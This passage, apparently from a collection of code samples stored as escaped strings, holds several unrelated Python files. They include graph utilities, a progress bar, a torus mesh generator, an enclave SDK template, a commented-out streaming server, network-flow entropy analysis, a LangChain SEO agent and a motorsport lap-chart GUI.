vertex at the beginning of the graph\n    graph[0] = {'predecessors': [], 'duration': 0}\n    \n    # Find all vertices that don't have predecessors and add vertex 0 as their predecessor\n    for vertex, data in graph.items():\n        if not data['predecessors'] and vertex != 0:\n            data['predecessors'].append(0)\n    \n    # Find all vertices that don't have successors and are not the vertex 0\n    vertices_without_successors = [vertex for vertex in graph if vertex != 0 and not any(vertex in graph[v]['predecessors'] for v in graph)]\n    n = len(graph)-1\n    # Add the fictitious vertex at the end of the graph\n    graph[n+1] = {'predecessors': vertices_without_successors, 'duration': 0}\n    \n    return graph\n\ndef display_graph(graph):\n    '''display_graph function takes as a parameter a graph and displays the graph'''\n    add_fictitious_vertices(graph)\n    display_graph_edges(graph)\n    display_graph_matrix(graph)\n\ndef display_graph_matrix(graph):\n    '''display_graph_matrix function takes as a parameter a graph and displays the matrix of the graph'''\n\n    num_vertices = len(graph)\n\n    matrix = [['*' for _ in range(num_vertices)] for _ in range(num_vertices)]\n    \n    for vertex, data in graph.items():\n        for predecessor in data['predecessors']:\n            duration = graph[predecessor]['duration']\n            matrix[predecessor][vertex] = f\"{duration}\"\n\n\n    print(\"\\nValue Matrix\")\n    print(\"   \", end=\"\")\n    for i in range(num_vertices):\n        print(f\" {i:<2}\", end=\"\")\n    print()\n    for i, row in enumerate(matrix, start=0):\n        print(f\"{i:<2} \", end=\"\")\n        for val in row:\n            if val == '*':\n                print('\\033[31m' + f\" {val:<2}\" + '\\033[0m', end=\"\")\n            else:\n                print(f\" {val:<2}\", end=\"\")\n        print()\n\ndef zero_edges(graph):\n    '''zero_edges function takes as a parameter a graph and returns True if the graph contains zero edges, False otherwise'''\n    for vertex, data in graph.items():\n        if not data['predecessors']:\n            print(f\"The edge {vertex} has a weight of 0\")\n\n    print(\"",
    "\"\"\"A progress bar for the command line\"\"\"\nimport sys\nimport time\n\n\nclass Progress:\n    \"\"\"Progress bar object for the comand line\n\n    This class allows to conveniently add progress bars to long running\n    calculations. It writes textual and graphical information about\n    the progress of a text to sys.stderr. To be used in the following\n    way:\n\n    >>> prog = Progress(100, \"Performing some long running task\")\n    >>> for step in some_long_calculation():\n    >>>     prog += 1\n    >>>     prog.show()\n    >>> prog.finish()\n\n    The progress bar displays the percentage of completion\n    (counter/total) and the real time taken by the calculation so far.\n\n    It is allowed to manually alter prog.counter and prog.total during\n    use.\n    \"\"\"\n    def __init__(self, total, title=\"Progress\", width=80):\n        \"\"\"Initialize Progress bar\n\n        Parameters:\n        total (number) -- maximum value of counter\n        title (str) -- information to be displayed\n        width (int) -- width of the display progress bar\n        \"\"\"\n        self.counter = 0\n        self.total = total\n        self.title = title\n        self.width = width\n        self.start_time = time.time()\n\n    def __iadd__(self, value):\n        \"\"\"Increase current counter by value\"\"\"\n        self.counter += value\n        return self\n\n    def show(self):\n        \"\"\"Display progress bar in its current state\"\"\"\n        sec = time.time()-self.start_time\n        # eta = self.total/self.counter*sec-sec if self.counter else 0\n        percent = 100*self.counter/self.total\n        title = f'{self.title} ({percent:.0f}% {sec//60:02.0f}:{sec%60:02.0f}) '\n        if len(title) >= self.width:\n            raise ValueError(\"Progress bar does not fit width. Shorten title of increase width.\")\n        bar_width = self.width - (len(title)) - 3\n        full_width = int(bar_width*self.counter/self.total)\n        empty_width = bar_width - full_width\n        sys.stdout.write('\\r'+title+'['+full_width*'#'+empty_width*'.'+']')\n        sys.stdout.flush()\n\n    def finish(self):\n        \"\"\"Hide progress bar\"\"\"\n        sys.stdout.write('\\r'+self.width*' '+'\\r')\n        sys.stdout.flush()\n",
    "\"\"\"\n\u4f5c\u8005 ljx\n\u521b\u5efa\u4e00\u4e2a\u7ba1\u9053\u76843D mesh\u6a21\u578b\u6587\u4ef6 ring.obj\n2024/4/7\n\nmayble: \npip install scipy\n\"\"\"\n\n\n\nimport math\nimport numpy as np\nfrom scipy.spatial.transform import Rotation as R\nimport open3d as o3d\n\n\n# \u5c06\u6a21\u578b\u7531normal1\u65cb\u8f6c\u5230normal2\ndef rotate_model(vertices, normal1, normal2):\n    # Normalize the normals\n    normal1 = normal1 / np.linalg.norm(normal1)\n    normal2 = normal2 / np.linalg.norm(normal2)\n    # Compute the rotation axis and angle\n    axis = np.cross(normal1, normal2)\n    angle = math.acos(np.dot(normal1, normal2))\n    # Create the rotation\n    rotation = R.from_rotvec(axis * angle)\n    # Apply the rotation to each vertex\n    rotated_vertices = [rotation.apply(vertex) for vertex in vertices]\n    return rotated_vertices\n\ndef create_ring_obj(r1, r2, theta, phi, center = [0,0,0], normal = [0, 0], alphaStep = 100, betaStep = 50):\n    \"\"\"\n    \u8f6c\u5f2f\u534a\u5f84 r1\n    \u73af\u4f53\u534a\u5f84 r2\n    \u8f6c\u5f2f\u8d77\u59cb theta\n    \u8f6c\u5f2f\u7ec8\u6b62 phi\n    \u6cd5\u5411\u91cf normal (\u4f7f\u7528\u7403\u9762\u5750\u6807\u7cfb\u8868\u793a (theta,phi) theta in [0,pi] and phi in [0,2*pi])\n    \u5706\u73af\u4e2d\u5fc3 center\n    alphaStep: alpha\u65b9\u5411\u4e0a\u7684\u5206\u5272\u6570\n    betaStep: beta\u65b9\u5411\u4e0a\u7684\u5206\u5272\u6570\n\n    \u904d\u5386alpha, beta\n        \u751f\u6210\u9876\u70b9\u5750\u6807:\n        x = (r1  + r2 * cos(beta)) * cos(alpha)\n        y = (r1  + r2 * cos(beta)) * sin(alpha)\n        z = r2 * sin(beta)\n    \"\"\"\n    normal = [np.sin(normal[0])*np.cos(normal[1]),np.sin(normal[0])*np.sin(normal[1]),np.cos(normal[0])]  \n\n    vertices = []\n    faces = []\n    alphas = np.linspace(theta, phi, alphaStep, endpoint=False)\n    betas = np.linspace(0, 2*np.pi, betaStep, endpoint=False)\n    \n    # generate vertices\n    for alpha in alphas:\n        for beta in betas:\n            x = (r1 + r2 * math.cos(beta)) * math.cos(alpha) \n            y = (r1 + r2 * math.cos(beta)) * math.sin(alpha) \n            z = r2 * math.sin(beta)\n            vertices.append([x, y, z])\n    # generate faces\n    for i in range(alphaStep-1):\n        for j in range(betaStep):\n            v1 = i * betaStep + j\n            v2 = i * betaStep + (j + 1) % betaStep\n            v3 = ((i+1) % alphaStep) * betaStep + (j + 1) % betaStep\n            v4 = ((i+1) % alphaStep) * betaStep + j\n            faces.append([v1, v2, v3, v4])\n    \n    # rotate the model\n    vertice2 = rotate_model(vertices, [0, 0, 1], normal)\n    vertices = [[v[0] + center[0], v[1] + center[1], v[2] + center[2]] for v in vertice2]\n\n    #for open3d interface\n    triangles = []\n    for face in faces:\n        triangles.append([face[0],face[1],face[2]])\n        triangles.append([face[2],face[3],face[0]])\n    mesh = o3d.geometry.TriangleMesh()\n    mesh.vertices = o3d.utility.Vector3dVector(vertices)\n    mesh.triangles = o3d.utility.Vector3iVector(triangles)\n    \n    #visualize\n    #o3d.visualization.draw([mesh])\n    #export obj\n    #o3d.io.write_triangle_mesh(\"ring.obj\", mesh)\n    return mesh\n\ndef sample_mesh_nearly(mesh,num_points=1000,radius=0.1):\n    mesh.compute_triangle_normals()\n    points = []\n    num_triangle_meshs = len(mesh.triangles)\n    for _ in range(num_points):\n        triangle_idx = np.random.randint(0,num_triangle_meshs)\n        u = np.random.uniform(0,1)\n        v = np.random.uniform(0,1)\n        if u + v > 1:\n            u = 1-u\n            v = 1-v\n        w = 1 - u -v\n        point = u*mesh.vertices[mesh.triangles[triangle_idx][0]] + v*mesh.vertices[mesh.triangles[triangle_idx][1]] + w*mesh.vertices[mesh.triangles[triangle_idx][2]]\n        point += np.random.uniform(-radius,radius)*mesh.triangle_normals[triangle_idx]\n        points.append(point)\n    pcd = o3d.geometry.PointCloud()\n    pcd.points = o3d.utility.Vector3dVector(np.asarray(points))\n    return pcd\n\nif __name__ == '__main__':\n    mesh = create_ring_obj(100, 10, np.pi/4, 2*np.pi/3, [0.7, 0.3, 0.5], [0,0])\n    pcd = sample_mesh_nearly(mesh,num_points=500)\n    o3d.visualization.draw([pcd])\n\n    ",
    "import EnclaveSDK\n\n# Set the code to access the Enclave API inside the enclave as follows:\nconfiguration = EnclaveSDK.Configuration(\"https://localhost:5000\")\nsas_url = None \n\n# Uncomment the following lines to use the EnclaveAPI Sandbox, make sure to comment before uploading to EscrowAI\n# configuration.host = \"https://sandbox.dev.escrow.beekeeperai.com\"\n# sas_url = 'SAS-URL-WITH-READ-AND-LIST-PERMISSIONS' \n\napi_client = EnclaveSDK.ApiClient(configuration)\n\ndef main():\n    \"\"\"Main function demonstrating how to use EnclaveSDK\"\"\"\n    \n    #### \n    # 1. List available data files\n    ###\n    # Create an instance of Data API class and list files in blob storage\n    api_data_instance = EnclaveSDK.DataApi(api_client)\n    api_response = api_data_instance.api_v1_data_files_get(sas_url=sas_url)\n    \n    ###\n    # 2. Fetch data files\n    ###\n    for file in api_response.files:\n      file_content = api_data_instance.api_v1_data_file_get(file.name, sas_url=sas_url)\n      print(file.name)\n\n    ### \n    # 3. Post a log message\n    ###\n    api_log_instance = EnclaveSDK.LogApi(api_client)\n    api_response = api_log_instance.api_v1_log_post(EnclaveSDK.LogData(message=\"Log message from algo-template.py\"))\n\n    ###\n    # 4. Validate a report with in-line schema\n    ###\n    api_report_instance = EnclaveSDK.ReportApi(api_client)\n    report = {\"json_data\": {\"report\": \"Performance Report\"},\n              \"json_schema\": { \"report\": { \"type\": \"string\", \"allowed\": [ \"Performance Report\" ] } },\n              \"name\": \"EscrowAI Algorithm Package\", \n              \"status\": \"Completed\"}\n    api_response = api_report_instance.api_v1_validate_post(EnclaveSDK.Report.from_dict(report))\n\n    ###\n    # 5. Post report\n    ###\n    # Create an instance of Report API class\n    api_report_instance = EnclaveSDK.ReportApi(api_client)\n    report = {\"json_data\": {\"report\": \"Performance Report\"}, \n              \"name\": \"EscrowAI Algorithm Package\", \n              \"status\": \"Completed\"}\n    api_response = api_report_instance.api_v1_report_post(EnclaveSDK.Report.from_dict(report))\n\nif __name__ == \"__main__\":\n    main()",
    "\r\n\r\n\r\n# import re\r\n# import math\r\n# import logging\r\n# import secrets\r\n# import mimetypes\r\n# from aiohttp import web\r\n# from aiohttp.http_exceptions import BadStatusLine\r\n# from lazybot import multi_clients, work_loads, StreamBot\r\n# from server.exceptions import FIleNotFound, InvalidHash\r\n# from zzint import StartTime, __version__\r\n# from ..util.custom_dl import ByteStreamer\r\n# from util.render_template import render_page\r\n# from info import *\r\n\r\n\r\n# routes = web.RouteTableDef()\r\n\r\n# @routes.get(\"/\", allow_head=True)\r\n# async def root_route_handler(request):\r\n#     return web.json_response(\"in & as LazyDeveloper...\")\r\n\r\n\r\n# @routes.get(r\"/watch/{path:\\S+}\", allow_head=True)\r\n# async def stream_handler(request: web.Request):\r\n#     try:\r\n#         path = request.match_info[\"path\"]\r\n#         match = re.search(r\"^([a-zA-Z0-9_-]{6})(\\d+)$\", path)\r\n#         if match:\r\n#             secure_hash = match.group(1)\r\n#             id = int(match.group(2))\r\n#         else:\r\n#             id = int(re.search(r\"(\\d+)(?:\\/\\S+)?\", path).group(1))\r\n#             secure_hash = request.rel_url.query.get(\"hash\")\r\n#         return web.Response(text=await render_page(id, secure_hash), content_type='text/html')\r\n#     except InvalidHash as e:\r\n#         raise web.HTTPForbidden(text=e.message)\r\n#     except FIleNotFound as e:\r\n#         raise web.HTTPNotFound(text=e.message)\r\n#     except (AttributeError, BadStatusLine, ConnectionResetError):\r\n#         pass\r\n#     except Exception as e:\r\n#         logging.critical(e.with_traceback(None))\r\n#         raise web.HTTPInternalServerError(text=str(e))\r\n\r\n# @routes.get(r\"/{path:\\S+}\", allow_head=True)\r\n# async def stream_handler(request: web.Request):\r\n#     try:\r\n#         path = request.match_info[\"path\"]\r\n#         match = re.search(r\"^([a-zA-Z0-9_-]{6})(\\d+)$\", path)\r\n#         if match:\r\n#             secure_hash = match.group(1)\r\n#             id = int(match.group(2))\r\n#         else:\r\n#             id = int(re.search(r\"(\\d+)(?:\\/\\S+)?\", path).group(1))\r\n#             secure_hash = request.rel_url.query.get(\"hash\")\r\n#         return await media_streamer(request, id, secure_hash)\r\n#     except InvalidHash as e:\r\n#         raise web.HTTPForbidden(text=e.message)\r\n#     except FIleNotFound as e:\r\n#         raise web.HTTPNotFound(text=e.message)\r\n#     except (AttributeError, BadStatusLine, ConnectionResetError):\r\n#         pass\r\n#     except Exception as e:\r\n#         logging.critical(e.with_traceback(None))\r\n#         raise web.HTTPInternalServerError(text=str(e))\r\n\r\n# class_cache = {}\r\n\r\n# async def media_streamer(request: web.Request, id: int, secure_hash: str):\r\n#     range_header = request.headers.get(\"Range\", 0)\r\n    \r\n#     index = min(work_loads, key=work_loads.get)\r\n#     faster_client = multi_clients[index]\r\n    \r\n#     if MULTI_CLIENT:\r\n#         logging.info(f\"Client {index} is now serving {request.remote}\")\r\n\r\n#     if faster_client in class_cache:\r\n#         tg_connect = class_cache[faster_client]\r\n#         logging.debug(f\"Using cached ByteStreamer object for client {index}\")\r\n#     else:\r\n#         logging.debug(f\"Creating new ByteStreamer object for client {index}\")\r\n#         tg_connect = ByteStreamer(faster_client)\r\n#         class_cache[faster_client] = tg_connect\r\n#     logging.debug(\"before calling get_file_properties\")\r\n#     file_id = await tg_connect.get_file_properties(id)\r\n#     logging.debug(\"after calling get_file_properties\")\r\n    \r\n#     if file_id.unique_id[:6] != secure_hash:\r\n#         logging.debug(f\"Invalid hash for message with ID {id}\")\r\n#         raise InvalidHash\r\n    \r\n#     file_size = file_id.file_size\r\n\r\n#     if range_header:\r\n#         from_bytes, until_bytes = range_header.replace(\"bytes=\", \"\").split(\"-\")\r\n#         from_bytes = int(from_bytes)\r\n#         until_bytes = int(until_bytes) if until_bytes else file_size - 1\r\n#     else:\r\n#         from_bytes = request.http_range.start or 0\r\n#         until_bytes = (request.http_range.stop or file_size) - 1\r\n\r\n#     if (until_bytes > file_size) or (from_bytes < 0) or (until_bytes < from_bytes):\r\n#         return web.Response(\r\n#             status=416,\r\n#             body=\"416: Range not satisfiable\",\r\n#             headers={\"Content-Range\": f\"bytes */{file_size}\"},\r\n#         )\r\n\r\n#     chunk_size = 1024 * 1024\r\n#     until_bytes = min(until_bytes, file_size - 1)\r\n\r\n#     offset = from_bytes - (from_bytes % chunk_size)\r\n#     first_part_cut = from_bytes - offset\r\n#     last_part_cut = until_bytes % chunk_size + 1\r\n\r\n#     req_length = until_bytes - from_bytes + 1\r\n#     part_count = math.ceil(until_bytes / chunk_size) - math.floor(offset / chunk_size)\r\n#     body = tg_connect.yield_file(\r\n#         file_id, index, offset, first_part_cut, last_part_cut, part_count, chunk_size\r\n#     )\r\n\r\n#     mime_type = file_id.mime_type\r\n#     file_name = file_id.file_name\r\n#     disposition = \"attachment\"\r\n\r\n#     if mime_type:\r\n#         if not file_name:\r\n#             try:\r\n#                 file_name = ",
    "# 1. City Infrastructure Management Systemclass Vehicle:\n# Task 1: Vehicle Registration System\nprint(\"-------------------- Task 1 --------------------\\n\")\nclass Vehicle:\n    def __init__(self, reg_num, type_, owner):\n        self.list = [owner, reg_num, type_]\n        self.registration_number = reg_num\n        self.type = type_\n        self.owner = owner\n    \n    def update_owner(self, owner):\n        self.list[0] = owner\n        self.owner = owner\n\nAlpha_Romeo = Vehicle(17745, \"Guilia\", \"Haya\")\nAcura = Vehicle(11425, \"TL\", \"Adam\")\nFord = Vehicle(44635, \"F-150\", \"Kevin\")\n\nprint(Alpha_Romeo.owner)\nprint(Alpha_Romeo.list)\nAlpha_Romeo.update_owner(\"Morgan\")\nprint(Alpha_Romeo.list)\nprint(Alpha_Romeo.owner)\n\n\nprint(\"\\n-------------------- Task 2 --------------------\\n\")\n# Task 2: Event Management System Enhancement\nclass Event:\n    def __init__(self, name, date):\n        self.name = name\n        self.date = date\n        self.count = 0\n\n    def add_participant(self, new_participants = 1):\n        self.count += new_participants\n    \n    def participant_count(self):\n        return self.count\n\nValorant = Event(\"VCT FINALSSSSSSSSS\", \"FOREVERRR AND EVERRRR AND EVERRRRRR\")\nprint(f\"{Valorant.name}: {Valorant.date}\")\nValorant.add_participant()\nprint(Valorant.participant_count())\nValorant.add_participant(9999)\nprint(Valorant.participant_count())\n\n",
    "from collections import Counter\r\nimport numpy as np\r\nfrom sklearn.decomposition import PCA\r\nimport pandas as pd\r\n\r\ndef fenetre_temporelle(df, duree, date_start_window):\r\n\t\"\"\"\r\n\tS\u00e9lectionne les donn\u00e9es dans une fen\u00eatre temporelle sp\u00e9cifi\u00e9e.\r\n\r\n\tArguments :\r\n\tdf : DataFrame - Le DataFrame contenant les donn\u00e9es.\r\n\tduree : int - Dur\u00e9e de la fen\u00eatre temporelle en minutes.\r\n\tdate_start_window : Timestamp - Date de d\u00e9but de la fen\u00eatre temporelle.\r\n\r\n\tRetourne :\r\n\tfenetre_data : DataFrame - Les donn\u00e9es dans la fen\u00eatre temporelle sp\u00e9cifi\u00e9e.\r\n\t\"\"\"\r\n\t# D\u00e9terminer la date de fin de la fen\u00eatre temporelle\r\n\tdate_end_window = date_start_window + pd.Timedelta(minutes=duree)\r\n\r\n\t# S\u00e9lectionner les donn\u00e9es de la fen\u00eatre temporelle\r\n\tfenetre_data = df[((df['StartTime'] < date_start_window) & (df['EndTime'] >= date_start_window)) |\r\n\t\t\t\t\t  ((df['StartTime'] <= date_end_window) & (df['StartTime'] >= date_start_window))]\r\n\treturn fenetre_data\r\n\r\ndef segmentation_of_dataFrame(datas, window_time_size=5):\r\n\t\"\"\"\r\n\tDivise un DataFrame en segments de temps sp\u00e9cifi\u00e9s.\r\n\r\n\tArguments :\r\n\tdatas : DataFrame - Le DataFrame contenant les donn\u00e9es.\r\n\twindow_time_size : int - Taille de la fen\u00eatre temporelle en minutes.\r\n\r\n\tRetourne :\r\n\tfenetre_donnees : list - Une liste de DataFrames, chaque DataFrame repr\u00e9sentant une fen\u00eatre temporelle.\r\n\t\"\"\"\r\n\tfenetre_donnees = []\r\n\r\n\tdate_start_window = datas['StartTime'].min()\r\n\twhile (date_start_window < datas['StartTime'].max()):\r\n\t\tfenetre_donnees.append(fenetre_temporelle(datas, window_time_size, date_start_window))\r\n\t\tdate_start_window += pd.Timedelta(minutes=window_time_size)\r\n\treturn fenetre_donnees\r\n\r\ndef upload_data(df, mode):\r\n\t\"\"\"\r\n\tPr\u00e9traite les donn\u00e9es en filtrant les adresses IP sources avec un compte sup\u00e9rieur \u00e0 1.\r\n\r\n\tArguments :\r\n\tdf : DataFrame - Le DataFrame contenant les donn\u00e9es.\r\n\tmode : String - In [\"srcIP\" , \"dstIP\"] sp\u00e9cifiant le mode du mod\u00e8le\r\n\r\n\tRetourne :\r\n\tformat_data : defaultdict - Un dictionnaire contenant les donn\u00e9es format\u00e9es.\r\n\tip_flux_une_fois : list - Liste des adresses IP qui apparaissent une seule fois.\r\n\t\"\"\"\r\n\t# Compter le nombre d'occurrences de chaque adresse IP source / destination\r\n\tif mode == 'srcIP' :\r\n\t\tip_mode_column = 'SrcAddr'\r\n\t\tformat_key_ip_mode = 'liste_dest_IP'\r\n\telse:\r\n\t\tip_mode_column = 'DstAddr'\r\n\t\tformat_key_ip_mode = 'liste_src_IP'\r\n  \r\n\tcounts = df[ip_mode_column].value_counts()\r\n\t# Filtrer les adresses IP sources/destinations avec un compte sup\u00e9rieur \u00e0 1\r\n\tips_a_garder = counts[counts >= 2].index.tolist()\r\n\t# Filtrer les donn\u00e9es d'entr\u00e9e pour ne conserver que celles dont l'adresse IP source est dans ips_a_garder\r\n\tdf_filtre = df[df[ip_mode_column].isin(ips_a_garder)]\r\n\t# R\u00e9cup\u00e9rer les adresses IP qui apparaissent une seule fois\r\n\tip_flux_une_fois = df.loc[~df[ip_mode_column].isin(ips_a_garder), ip_mode_column].unique()\r\n\r\n\t# Cr\u00e9er un dictionnaire pour stocker les donn\u00e9es format\u00e9es\r\n\tformat_data = {}\r\n\tfor ip, group in df_filtre.groupby(ip_mode_column):\r\n\t\tformat_data[ip] = {\r\n\t\t\t\"liste_src_P\": group['Sport'].tolist(),  # Convertir les colonnes en listes\r\n\t\t\t\"liste_dest_P\": group['Dport'].tolist(),\r\n\t\t\tformat_key_ip_mode : group[ip_mode_column].tolist(),\r\n\t\t\t\"liste_flags\": group['State'].tolist()\r\n\t\t}\r\n\r\n\treturn format_data, ip_flux_une_fois\r\n\r\ndef calcul_entropies(datas, ip_sources_entropie_zeros, mode):\r\n\t\"\"\"\r\n\tCalcule les entropies des donn\u00e9es pour chaque adresse IP source.\r\n\r\n\tArguments :\r\n\tdatas : defaultdict - Un dictionnaire contenant les donn\u00e9es format\u00e9es.\r\n\tip_sources_entropie_zeros : list - Liste des adresses IP avec entropie nulle.\r\n\tmode : String - In [\"srcIP\" , \"dstIP\"] sp\u00e9cifiant le mode du mod\u00e8le\r\n\r\n\tRetourne :\r\n\tentropries : dict - Un dictionnaire contenant les entropies calcul\u00e9es pour chaque adresse IP source.\r\n\t\"\"\"\r\n\tif mode == 'srcIP' :\r\n\t\tdata_key_ip_mode = 'liste_dest_IP'\r\n\t\tH_IP_mode = 'H_dest_IP'\r\n\telse:\r\n\t\tdata_key_ip_mode = 'liste_src_IP'\r\n\t\tH_IP_mode = 'H_src_IP'\r\n\r\n\thistogramme = {adresse_ip: {\"liste_src_P\": Counter(dic_list[\"liste_src_P\"]), \"liste_dest_P\": Counter(dic_list[\"liste_dest_P\"]),\r\n\t\t\t\t\t\t\t\tdata_key_ip_mode: Counter(dic_list[data_key_ip_mode]),\r\n\t\t\t\t\t\t\t\t\"liste_flags\": Counter(dic_list[\"liste_flags\"])}\r\n\t\t\t\t   for adresse_ip, dic_list in datas.items()}\r\n\r\n\tprobabilites = {ip_source: {\"liste_src_P\": {port: count / sum(dic_listip_src[\"liste_src_P\"].values()) for port, count in\r\n\t\t\t\t\t\t\t\t\t\t\t\t dic_listip_src[\"liste_src_P\"].items()},\r\n\t\t\t\t\t\t\t\t\"liste_dest_P\": {port: count / sum(dic_listip_src[\"liste_dest_P\"].values()) for port,\r\n\t\t\t\t\t\t\t\t\t\t\t\t count in dic_listip_src[\"liste_dest_P\"].items()},\r\n\t\t\t\t\t\t\t\tdata_key_ip_mode: {ip_dest: count / sum(dic_listip_src[data_key_ip_mode].values()) for\r\n\t\t\t\t\t\t\t\t\t\t\t\t  ip_dest, count in dic_listip_src[data_key_ip_mode].items()},\r\n\t\t\t\t\t\t\t\t\"liste_flags\": {flag: count / sum(dic_listip_src[\"liste_flags\"].values()) for flag, count\r\n\t\t\t\t\t\t\t\t\t\t\t\tin dic_listip_src[\"liste_flags\"].items()}}\r\n\t\t\t\t\tfor ip_source, dic_listip_src in histogramme.items()}\r\n\r\n\tentropries = {adresse_ip: {\"H_src_P\": -sum([p",
    "import os\nimport requests\nfrom bs4 import BeautifulSoup\nfrom dotenv import load_dotenv\n\nfrom langchain.tools import Tool, DuckDuckGoSearchResults\nfrom langchain.utilities import SerpAPIWrapper\nfrom langchain.prompts import PromptTemplate\nfrom langchain.chat_models import ChatOpenAI\nfrom langchain.chains import LLMChain\nfrom langchain.agents import initialize_agent, AgentType\n\nload_dotenv()\n\nos.environ[\"OPENAI_API_KEY\"] = os.getenv(\"OPENAI_APIKEY\")\nos.environ[\"SERPAPI_API_KEY\"] = os.getenv(\"SERPAPI_APIKEY\")\n\nHEADERS = {\n    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'\n}\n\nddg_search = DuckDuckGoSearchResults()\nsearch = SerpAPIWrapper()\n\nserpapi_tool = Tool(\n    name=\"Search\",\n    func=search.run,\n    description=\"Useful for when you need to answer questions about current events\",\n)\n\ndef parse_html(content) -> str:\n    soup = BeautifulSoup(content, 'html.parser')\n    return soup.get_text()\n\ndef fetch_web_page(url: str) -> str:\n    response = requests.get(url, headers=HEADERS)\n    return parse_html(response.content)\n\nweb_fetch_tool = Tool.from_function(\n    func=fetch_web_page,\n    name=\"WebFetcher\",\n    description=\"Fetches the content of a web page\"\n)\n\nprompt_template = \"Summarize the following content in more or less than 400 words. The content is about a product and we need to generate SEO friendly data. Also you have to search the internet for all different names the product is called by in local or regional parts of the world. scrape the internet and find all the names , it could have multiple name and then list them.: {content}\"\nllm = ChatOpenAI(model=\"gpt-4-turbo\")\nllm_chain = LLMChain(llm=llm, prompt=PromptTemplate.from_template(prompt_template))\nsummarize_tool = Tool.from_function(\n    func=llm_chain.run,  # Note: Adjust according to actual function reference.\n    name=\"Summarizer\",\n    description=\"Summarizes a web page\"\n)\n\n\ntools = [serpapi_tool, web_fetch_tool, summarize_tool]\nagent = initialize_agent(\n    tools=tools,\n    agent_type=AgentType.ZERO_SHOT_REACT_DESCRIPTION,\n    llm=llm,\n    verbose=True,\n    handle_parsing_errors=True\n)\n\nprompt = None\n\ndef process_prompt(prompt: str) -> str:\n    post_prompt = '''. Use your tools to search the internet about the product and its aletnate names in local terms in India in english.\n      You need to search the internet and find all the different names of the product called in different regions all around India in english, along with the location of the native name using the web search, there can be more than one single name so do not miss the other names. \n    Create a proper product name, product description, about product in points, a product tagline.\n    In product description also add the history of the product as well the the benefit of the product with the target as explanation of the product as to why this product should be used. The intension is to display as much information about the product in the most innovative way as possible. The output should be in this format :\nProduct Name: [product name]\nDifferent names of the Product: [different names of the product(along with the the local area of the native name), another product name(local area of the native name).... and so on]\nProduct Description: [product description should be minimum 400 words]\nAbout Product: [about product in points]\nProduct Tagline: [product tagline]\nalso generate a SEO friendly data for the product, like tags.\nThe generated data should be more or less around 400 words.\nDo not break the above format.\n\n'''\n    prompt = prompt+\" \"+post_prompt\n    return agent.run(prompt)\n\n\nif __name__ == \"__main__\":\n    # Test processing a prompt\n    test_prompt = \"Name of the product : intitle : \u0915\u093e\u0932\u093e \u0928\u092e\u0915 \u091a\u093e\u0935\u0932\"\n    print(\"Processing Prompt:\", test_prompt)\n    processed_prompt = process_prompt(test_prompt)\n    print(\"Processed Prompt Result:\", processed_prompt)\n",
    "## TO-DO\n## Find an effective way to show cars with multiple drivers\n## Tidy up GUI\n## Include other types of graphs. See Issue #1\n## Animate the lap chart graph\n\nimport matplotlib.pyplot as plt\nimport requests\nimport tkinter as tk\nfrom tkinter import ttk, messagebox\n\nclass App(tk.Tk):\n    def __init__(self):\n        super().__init__()\n        self.title('Lap Chart Plotter')\n\n        self.geometry('300x340')\n        self.resizable(False, False)\n        self.columnconfigure(0, weight=2)\n        self.columnconfigure(1, weight=1)\n        self.columnconfigure(2, weight=2)\n\n        resetButton = tk.Button(self, text='Reset', command=self.reset)\n        resetButton.place(x=175, y=240)\n\n        self.lapChartButton = tk.Button(self, text='Load Lap Chart', \n                                        command=self.loadLapChart)\n        self.lapChartButton.place(x=75, y=240)\n        self.lapChartButton.configure(state='disabled')\n\n        # not implemented\n        # self.paceChartButton = tk.Button(self, text='Load Pace Chart', \n        #                                  command=self.loadPaceChart)\n        # self.paceChartButton.place(x=75, y=270)\n        # self.paceChartButton.configure(state='disabled')\n                                                    \n\n        self.chooseDecade()\n    \n    def reset(self):\n            self.destroy()\n            App()\n    \n    def chooseDecade(self):\n        self.decadeVar = tk.StringVar(self)\n        self.decadeVar.set(\"\")\n\n        self.boxDecade = ttk.OptionMenu(\n            self, self.decadeVar, \n            \"Select a decade\", \"2020s\", \n            \"2010s\", \"2000s\", \"1990s\", \n            \"1980s\", \"1970s\", \"1960s\", \n            \"1950s\", command=self.chooseSeries\n            )\n        self.boxDecade.grid(column = 1, row = 0, padx=20, \n                            pady=10, sticky=tk.EW)\n    \n    def chooseSeries(self, decade: str):\n        self.boxDecade.configure(state='disabled')\n\n        r = requests.get(f'https://motorsportstats.com/api/advanced-search?entity=series&size=999&filterIds={decade}')\n        data = r.json()\n        self.dictSeries = dict((i['name'], i['uuid']) for i in data['content'])\n\n\n        self.seriesVar = tk.StringVar(self)\n        self.seriesVar.set(\"\")\n\n        self.boxSeries = ttk.OptionMenu(self, self.seriesVar, \n                                        \"Select a series\", \n                                        *self.dictSeries.keys(), \n                                        command=self.chooseYear)\n        self.boxSeries.grid(column = 1, row = 1, padx=20, pady=10, sticky=tk.EW)\n\n    def chooseYear(self, series: str):\n        self.boxSeries.configure(state='disabled')\n        self.yearVar = tk.StringVar(self)\n        self.yearVar.set(\"\")\n\n        years = [int(str(self.decadeVar.get()[:3]) + str(i)) for i in range(0,10)]\n        self.boxYear = ttk.OptionMenu(self, self.yearVar, \n                                      \"Select a year\", *years, \n                                      command=self.chooseRace)\n        self.boxYear.grid(column = 1, row = 2, padx=20, \n                          pady=10, sticky=tk.EW)\n    \n    def chooseRace(self, year: int):\n        self.boxYear.configure(state='disabled')\n\n        seriesUUID = self.dictSeries[self.seriesVar.get()]\n\n        r = requests.get(f'https://motorsportstats.com/api/advanced-search?entity=events&size=999&filterIds={seriesUUID}&filterIds={year}')\n        data = r.json()\n        if data['totalElements'] == 0:\n            messagebox.showerror(\"1. Error\", \"An error occured. The lap chart likely doesn't exist for this race\")\n            self.reset()\n\n        self.dictRace = dict((i['name'], i['uuid']) for i in data['content'])\n\n        self.raceVar = tk.StringVar()\n        self.raceVar.set(\"\")\n\n        self.boxRace = ttk.OptionMenu(self, self.raceVar,\n                                      \"Select a race\",\n                                      *self.dictRace.keys(), \n                                      command=self.chooseSession)\n        self.boxRace.grid(column = 1, row = 3, padx=20, \n                          pady=10, sticky=tk.EW)\n        \n    def chooseSession(self, race: str):\n        self.boxRace.configure(state='disabled')\n\n        # the only way to find available sessions seems to be trial and error. \n        # only races are available as quali/practice tend to have strange data that doesn't work on the graph\n        sessionNames = ['race', 'race-1', 'race-2', 'race-3', 'race-4', 'race-5']     \n                                  \n        validSessions = []\n        for i in sessionNames:\n            try:\n                r = 